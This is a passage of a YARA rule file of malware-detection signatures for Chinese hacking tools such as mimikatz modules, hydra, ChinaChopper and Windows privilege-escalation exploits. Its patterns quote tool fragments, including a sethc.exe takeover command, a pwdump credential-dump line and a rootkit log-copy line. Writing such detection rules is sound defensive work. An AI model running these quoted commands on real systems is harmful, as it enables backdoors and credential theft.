them\n}\n\nrule ChineseHacktools_OtherTools_xiaoa\n{\n    meta:\n        description = \"Chinese hacktool (file: xiaoa.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OtherTools_xiaoa\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Usage:system_exp.exe \\\"cmd\\\"\" fullword ascii\n        $s2 = \"The shell \\\"cmd\\\" success!\" fullword ascii\n        $s3 = \"Not Windows NT family OS.\" fullword ascii\n        $s4 = \"Unable to get kernel base address.\" fullword ascii\n        $s5 = \"run \\\"%s\\\" failed,code: %d\" fullword ascii\n        $s6 = \"Windows Kernel Local Privilege Exploit \" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and 2 of them\n}\n\nrule ChineseHacktools_unknown2\n{\n    meta:\n        description = \"Chinese hacktool (file: unknown2.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"unknown2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://md5.com.cn/index.php/md5reverse/index/md/\" fullword wide\n        $s2 = \"http://www.md5decrypter.co.uk/feed/api.aspx?\" fullword wide\n        $s3 = \"http://www.md5.com.cn\" fullword wide\n        $s4 = \"1.5.exe\" fullword wide\n        $s5 = \"\\\\Set.ini\" fullword wide\n        $s6 = \"OpenFileDialog1\" fullword wide\n        $s7 = \" (*.txt)|*.txt\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and 4 of them\n}\n\nrule ChineseHacktools_hydra_7_3_hydra\n{\n    meta:\n        description = \"Chinese hacktool (file: hydra.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"hydra_7_3_hydra\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[ATTEMPT-ERROR] target %s - login \\\"%s\\\" - pass \\\"%s\\\" - child %d - %lu of %lu\" fullword ascii\n        $s2 = \"(DESCRIPTION=(CONNECT_DATA=(CID=(PROGRAM=))(COMMAND=reload)(PASSWORD=%s)(SERVICE\" ascii\n        $s3 = \"cn=^USER^,cn=users,dc=foo,dc=bar,dc=com for domain foo.bar.com\" fullword ascii\n        $s4 = \"[%d][smb] Host: %s Account: %s Error: ACCOUNT_CHANGE_PASSWORD\" fullword ascii\n        $s5 = \"hydra -P pass.txt target cisco-enable  (direct console access)\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 700KB and 1 of them\n}\n\nrule ChineseHacktools_OracleScan\n{\n    meta:\n        description = \"Chinese hacktool (file: OracleScan.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OracleScan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"MYBLOG:HTTP://HI.BAIDU.COM/0X24Q\" fullword ascii\n        $s2 = \"\\\\Borland\\\\Delphi\\\\RTL\" fullword ascii\n        $s3 = \"USER_NAME\" ascii\n        $s4 = \"FROMWWHERE\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule ChineseHacktools_SQLTools\n{\n    meta:\n        description = \"Chinese hacktool (file: SQLTools.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"SQLTools\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"DBN_POST\" fullword wide\n        $s2 = \"LOADER ERROR\" fullword ascii\n        $s3 = \"www.1285.net\" fullword wide\n        $s4 = \"TUPFILEFORM\" fullword wide\n        $s5 = \"DBN_DELETE\" fullword wide\n        $s6 = \"DBINSERT\" fullword wide\n        $s7 = \"Copyright (C) Kibosoft Corp. 2001-2006\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2350KB and all of them\n}\n\nrule ChineseHacktools_portscanner\n{\n    meta:\n        description = \"Chinese hacktool (file: portscanner.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"portscanner\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"PortListfNo\" fullword ascii\n        $s1 = \".533.net\" fullword ascii\n        $s2 = \"CRTDLL.DLL\" fullword ascii\n        $s3 = \"exitfc\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 25KB and all of them\n}\n\nrule ChineseHacktools_kappfree\n{\n    meta:\n        description = \"Chinese hacktool (file: kappfree.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"kappfree\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Bienvenue dans un processus distant\" fullword wide\n        $s2 = \"kappfree.dll\" fullword ascii\n        $s3 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_ChinaChopper_caidao\n{\n    meta:\n        description = \"Chinese hacktool (file: caidao.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ChinaChopper_caidao\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Pass,Config,n{)\" fullword ascii\n        $s2 = \"phMYSQLZ\" fullword ascii\n        $s3 = \"\\\\DHLP\\\\.\" fullword ascii\n        $s4 = \"\\\\dhlp\\\\.\" fullword ascii\n        $s5 = \"SHAutoComple\" fullword ascii\n        $s6 = \"MainFrame\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1077KB and all of them\n}\n\nrule ChineseHacktools_KiwiTaskmgr_2\n{\n    meta:\n        description = \"Chinese hacktool (file: KiwiTaskmgr.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"KiwiTaskmgr_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Process Ok, Memory Ok, resuming process :)\" fullword wide\n        $s2 = \"Kiwi Taskmgr no-gpo\" fullword wide\n        $s3 = \"KiwiAndTaskMgr\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 300KB and all of them\n}\n\nrule ChineseHacktools_kappfree_2\n{\n    meta:\n        description = \"Chinese hacktool (file: kappfree.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"kappfree_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"kappfree.dll\" fullword ascii\n        $s2 = \"kappfree de mimikatz pour Windows (anti AppLocker)\" fullword wide\n        $s3 = \"' introuvable !\" fullword wide\n        $s4 = \"kiwi\\\\mimikatz\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule ChineseHacktools_x_way2_5_sqlcmd\n{\n    meta:\n        description = \"Chinese hacktool (file: sqlcmd.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"x_way2_5_sqlcmd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"LOADER ERROR\" fullword ascii\n        $s2 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n        $s3 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n        $s4 = \"kernel32.dll\" fullword ascii\n        $s5 = \"VirtualAlloc\" fullword ascii\n        $s6 = \"VirtualFree\" fullword ascii\n        $s7 = \"VirtualProtect\" fullword ascii\n        $s8 = \"ExitProcess\" fullword ascii\n        $s9 = \"user32.dll\" fullword ascii\n        $s16 = \"MessageBoxA\" fullword ascii\n        $s10 = \"wsprintfA\" fullword ascii\n        $s11 = \"kernel32.dll\" fullword ascii\n        $s12 = \"GetProcAddress\" fullword ascii\n        $s13 = \"GetModuleHandleA\" fullword ascii\n        $s14 = \"LoadLibraryA\" fullword ascii\n        $s15 = \"odbc32.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 23KB and filesize > 20KB and all of them\n}\n\nrule ChineseHacktools_Win32_klock\n{\n    meta:\n        description = \"Chinese hacktool (file: klock.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Win32_klock\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"klock.dll\" fullword ascii\n        $s2 = \"Erreur : impossible de basculer le bureau ; SwitchDesktop : \" fullword wide\n        $s3 = \"klock de mimikatz pour Windows\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule ChineseHacktools_ipsearcher\n{\n    meta:\n        description = \"Chinese hacktool (file: ipsearcher.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ipsearcher\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"http://www.wzpg.com\" fullword ascii\n        $s1 = \"ipsearcher\\\\ipsearcher\\\\Release\\\\ipsearcher.pdb\" fullword ascii\n        $s3 = \"_GetAddress\" fullword ascii\n        $s5 = \"ipsearcher.dll\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 140KB and all of them\n}\n\nrule ChineseHacktools_ms10048_x64\n{\n    meta:\n        description = \"Chinese hacktool (file: ms10048-x64.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"ms10048_x64\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"The target is most likely patched.\" fullword ascii\n        $s2 = \"Dojibiron by Ronald Huizer, (c) master#h4cker.us  \" fullword ascii\n        $s3 = \"[ ] Creating evil window\" fullword ascii\n        $s4 = \"[+] Set to %d exploit half succeeded\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and 1 of them\n}\n\nrule ChineseHacktools_hscangui\n{\n    meta:\n        description = \"Chinese hacktool (file: hscangui.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"hscangui\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n        $s2 = \"http://www.cnhonker.com\" fullword ascii\n        $s3 = \"%s@ftpscan#Cracked account:  %s/%s\" fullword ascii\n        $s4 = \"[%s]: Found \\\"FTP account: %s/%s\\\" !!!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 220KB and 2 of them\n}\n\nrule ChineseHacktools_GoodToolset_ms11080\n{\n    meta:\n        description = \"Chinese hacktool (file: ms11080.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"GoodToolset_ms11080\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[*] command add user 90sec 90sec\" fullword ascii\n        $s2 = \"\\\\ms11080\\\\Debug\\\\ms11080.pdb\" fullword ascii\n        $s3 = \"[>] by:Mer4en7y@90sec.org\" fullword ascii\n        $s4 = \"[*] Add to Administrators success\" fullword ascii\n        $s5 = \"[*] User has been successfully added\" fullword ascii\n        $s6 = \"[>] ms11-08 Exploit\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 240KB and 2 of them\n}\n\nrule ChineseHacktools_epathobj_exp64\n{\n    meta:\n        description = \"Chinese hacktool (file: epathobj_exp64.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"epathobj_exp64\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Watchdog thread %d waiting on Mutex\" fullword ascii\n        $s2 = \"Exploit ok run command\" fullword ascii\n        $s3 = \"\\\\epathobj_exp\\\\x64\\\\Release\\\\epathobj_exp.pdb\" fullword ascii\n        $s4 = \"Alllocated userspace PATHRECORD () %p\" fullword ascii\n        $s5 = \"Mutex object did not timeout, list not patched\" fullword ascii\n        $s6 = \"- inconsistent onexit begin-end variables\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 150KB and 2 of them\n}\n\nrule ChineseHacktools_kelloworld_2\n{\n    meta:\n        description = \"Chinese hacktool (file: kelloworld.dll)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"kelloworld_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Hello World!\" fullword wide\n        $s2 = \"kelloworld.dll\" fullword ascii\n        $s3 = \"kelloworld de mimikatz pour Windows\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_HScan_v1_20_hscan\n{\n    meta:\n        description = \"Chinese hacktool (file: hscan.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HScan_v1_20_hscan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"[%s]: Found \\\"FTP account: anyone/anyone@any.net\\\"  !!!\" fullword ascii\n        $s2 = \"%s -h 192.168.0.1 192.168.0.254 -port -ftp -max 200,100\" fullword ascii\n        $s3 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n        $s4 = \".\\\\log\\\\Hscan.log\" fullword ascii\n        $s5 = \"[%s]: Found cisco Enable password: %s !!!\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule ChineseHacktools_Project1_Generate_rejoice\n{\n    meta:\n        description = \"Chinese hacktool (files: Project1.exe, Generate.exe, rejoice.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"_Project1_Generate_rejoice\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"sfUserAppDataRoaming\" fullword ascii\n        $s2 = \"$TRzFrameControllerPropertyConnection\" fullword ascii\n        $s3 = \"delphi32.exe\" fullword ascii\n        $s4 = \"hkeyCurrentUser\" fullword ascii\n        $s5 = \"%s is not a valid IP address.\" fullword wide\n        $s6 = \"Citadel hooking error\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2000KB and all of them\n}\n\nrule ChineseHacktools_hscan_hscan_hscangui\n{\n    meta:\n        description = \"Chinese hacktool (files: hscan.exe, hscan.exe, hscangui.exe)\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"_hscan_hscan_hscangui\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \".\\\\log\\\\Hscan.log\" fullword ascii\n        $s2 = \".\\\\report\\\\%s-%s.html\" fullword ascii\n        $s3 = \"[%s]: checking \\\"FTP account: ftp/ftp@ftp.net\\\" ...\" fullword ascii\n        $s4 = \"[%s]: IPC NULL session connection success !!!\" fullword ascii\n        $s5 = \"Scan %d targets,use %4.1f minutes\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 240KB and all of them\n}\n\nrule ChineseHacktools_kiwi_tools\n{\n    meta:\n        description = \"Chinese hacktool\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"kiwi_tools\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://blog.gentilkiwi.com/mimikatz\" ascii\n        $s2 = \"Benjamin Delpy\" fullword ascii\n        $s3 = \"GlobalSign\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule ChineseHacktools_kiwi_tools_gentil_kiwi\n{\n    meta:\n        description = \"Chinese hacktool\"\n        ref = \"http://tools.zjqhr.com/\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"kiwi_tools_gentil_kiwi\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"mimikatz\" fullword wide\n        $s2 = \"Copyright (C) 2012 Gentil Kiwi\" fullword wide\n        $s3 = \"Gentil Kiwi\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule ChineseHacktools_mafix_root\n{\n    meta:\n        description = \"Chinese hacktool (file: root)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_mafix_root\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"echo \\\"# vbox (voice box) getty\\\" >> /tmp/.init1\" fullword ascii\n        $s1 = \"cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog\" fullword ascii\n        $s2 = \"if [ -f /sbin/xlogin ]; then\" fullword ascii\n\n    condition:\n        filesize < 96KB and all of them\n}\n\nrule ChineseHacktools_passwd_dict_3389\n{\n    meta:\n        description = \"Chinese hacktool (file: 3389.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_passwd_dict_3389\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"654321\" fullword ascii\n        $s1 = \"admin123\" fullword ascii\n        $s2 = \"admin123456\" fullword ascii\n        $s3 = \"administrator\" fullword ascii\n        $s4 = \"passwd\" fullword ascii\n        $s5 = \"password\" fullword ascii\n        $s7 = \"12345678\" fullword ascii\n        $s8 = \"888888\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule ChineseHacktools_Perl_serv_U\n{\n    meta:\n        description = \"Chinese hacktool (file: Perl-serv-U.pl)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Perl_serv_U\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"$dir = 'C:\\\\\\\\WINNT\\\\\\\\System32\\\\\\\\';\" fullword ascii\n        $s2 = \"$sock = IO::Socket::INET->new(\\\"127.0.0.1:$adminport\\\") || die \\\"fail\\\";\" fullword ascii\n\n    condition:\n        filesize < 8KB and all of them\n}\n\nrule ChineseHacktools_F4ck_Team_f4ck\n{\n    meta:\n        description = \"Chinese hacktool (file: f4ck.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_F4ck_Team_f4ck\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"PassWord:F4ckTeam!@#\" fullword ascii\n        $s1 = \"UserName:F4ck\" fullword ascii\n        $s2 = \"F4ck Team\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule ChineseHacktools_sig_3389_3389\n{\n    meta:\n        description = \"Chinese hacktool (file: 3389.vbs)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_sig_3389_3389\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"success = obj.run(\\\"cmd /c takeown /f %SystemRoot%\\\\system32\\\\sethc.exe&echo y| \" ascii\n\n    condition:\n        filesize < 10KB and all of them\n}\n\nrule ChineseHacktools_sig_3389_3389_2\n{\n    meta:\n        description = \"Chinese hacktool (file: 3389.bat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_sig_3389_3389_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"@del c:\\\\termsrvhack.dll\" fullword ascii\n        $s2 = \"@del c:\\\\3389.txt\" fullword ascii\n\n    condition:\n        filesize < 3KB and all of them\n}\n\nrule ChineseHacktools_Injection_Transit_jmCook\n{\n    meta:\n        description = \"Chinese hacktool (file: jmCook.asp)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Injection_Transit_jmCook\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \".Open \\\"POST\\\",PostUrl,False\" fullword ascii\n        $s2 = \"JmdcwName=request(\\\"jmdcw\\\")\" fullword ascii\n\n    condition:\n        filesize < 9KB and all of them\n}\n\nrule ChineseHacktools_Pwdump7_Pwdump7\n{\n    meta:\n        description = \"Chinese hacktool (file: Pwdump7.bat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Pwdump7_Pwdump7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Pwdump7.exe >pass.txt\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule ChineseHacktools_portRecall_pr\n{\n    meta:\n        description = \"Chinese hacktool (file: pr)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_portRecall_pr\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Usage: Same as lcx.exe in win32 :)\" fullword ascii\n        $s2 = \"connect to client\" fullword ascii\n        $s3 = \"PR(Packet redirection) for linux \" fullword ascii\n\n    condition:\n        filesize < 70KB and all of them\n}\n\nrule ChineseHacktools_sig_3389_3389_3\n{\n    meta:\n        description = \"Chinese hacktool (file: 3389.bat)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = 